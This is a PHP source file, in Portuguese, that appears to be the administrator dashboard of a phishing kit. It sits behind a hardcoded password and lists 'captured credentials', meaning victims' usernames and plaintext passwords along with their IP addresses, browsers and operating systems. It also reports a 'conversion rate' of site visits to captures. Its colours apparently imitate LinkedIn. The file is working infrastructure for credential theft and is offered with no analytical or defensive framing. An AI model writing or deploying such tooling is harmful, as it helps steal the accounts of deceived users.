<?php
require_once 'config.php';

session_start();
$senha_admin = 'admin123';

if (!isset($_SESSION['admin_logado'])) {
    if (isset($_POST['senha_admin'])) {
        if ($_POST['senha_admin'] === $senha_admin) {
            $_SESSION['admin_logado'] = true;
        } else {
            $erro = "Senha incorreta!";
        }
    }
    
    if (!isset($_SESSION['admin_logado'])) {
        ?>
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Admin - Login</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: Arial, sans-serif; background: #f3f2ef; display: flex; justify-content: center; align-items: center; height: 100vh; }
                .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); max-width: 400px; width: 100%; }
                h2 { color: #0a66c2; margin-bottom: 20px; }
                input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
                button { width: 100%; padding: 12px; background: #0a66c2; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 600; }
                button:hover { background: #004182; }
                .erro { color: #d11124; margin-top: 10px; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>Acesso Administrativo</h2>
                <form method="POST">
                    <input type="password" name="senha_admin" placeholder="Senha do administrador" required>
                    <button type="submit">Entrar</button>
                </form>
                <?php if (isset($erro)) echo "<p class='erro'>$erro</p>"; ?>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: admin.php');
    exit;
}

$conn = conectarBanco();

if (!$conn) {
    die("Erro ao conectar ao banco de dados");
}

$stats = $conn->query("SELECT * FROM estatisticas LIMIT 1")->fetch_assoc();
$ultimas_capturas = $conn->query("SELECT * FROM vw_relatorio_capturas ORDER BY timestamp DESC LIMIT 50");
$por_origem = $conn->query("SELECT origem, COUNT(*) as total FROM credenciais_capturadas GROUP BY origem");

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel Administrativo</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f3f2ef; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .header h1 { color: #0a66c2; }
        .logout-btn { background: #d11124; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 20px; }
        .stat-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .stat-card h3 { color: #666; font-size: 14px; margin-bottom: 10px; }
        .stat-card .number { font-size: 32px; font-weight: bold; color: #0a66c2; }
        .table-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #f3f2ef; padding: 12px; text-align: left; font-weight: 600; color: #666; }
        td { padding: 12px; border-bottom: 1px solid #f3f2ef; }
        tr:hover { background: #f9f9f9; }
        .senha { font-family: monospace; background: #f3f2ef; padding: 2px 6px; border-radius: 3px; }
        .timestamp { color: #666; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 Painel Administrativo</h1>
            <a href="?logout=1" class="logout-btn">Sair</a>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3>Total de Acessos</h3>
                <div class="number"><?php echo $stats['total_acessos']; ?></div>
            </div>
            <div class="stat-card">
                <h3>Credenciais Capturadas</h3>
                <div class="number"><?php echo $stats['total_capturas']; ?></div>
            </div>
            <div class="stat-card">
                <h3>Taxa de Conversão</h3>
                <div class="number">
                    <?php 
                    $taxa = $stats['total_acessos'] > 0 ? round(($stats['total_capturas'] / $stats['total_acessos']) * 100, 1) : 0;
                    echo $taxa . '%';
                    ?>
                </div>
            </div>
        </div>
        
        <div class="table-container">
            <h2 style="margin-bottom: 20px; color: #0a66c2;">Últimas Credenciais Capturadas</h2>
            <table>
                <thead>
                    <tr>
                        <th>ID</th>
                        <th>Usuário</th>
                        <th>Senha</th>
                        <th>IP</th>
                        <th>Navegador</th>
                        <th>Sistema</th>
                        <th>Data/Hora</th>
                    </tr>
                </thead>
                <tbody>
                    <?php while ($row = $ultimas_capturas->fetch_assoc()): ?>
                    <tr>
                        <td><?php echo $row['id']; ?></td>
                        <td><?php echo htmlspecialchars($row['usuario']); ?></td>
                        <td><span class="senha"><?php echo htmlspecialchars($row['senha'] ?? 'N/A'); ?></span></td>
                        <td><?php echo htmlspecialchars($row['ip_address']); ?></td>
                        <td><?php echo htmlspecialchars($row['navegador'] ?? 'N/A'); ?></td>
                        <td><?php echo htmlspecialchars($row['sistema_operacional'] ?? 'N/A'); ?></td>
                        <td class="timestamp"><?php echo date('d/m/Y H:i:s', strtotime($row['timestamp'])); ?></td>
                    </tr>
                    <?php endwhile; ?>
                </tbody>
            </table>
        </div>
    </div>
</body>
</html>
<?php $conn->close(); ?>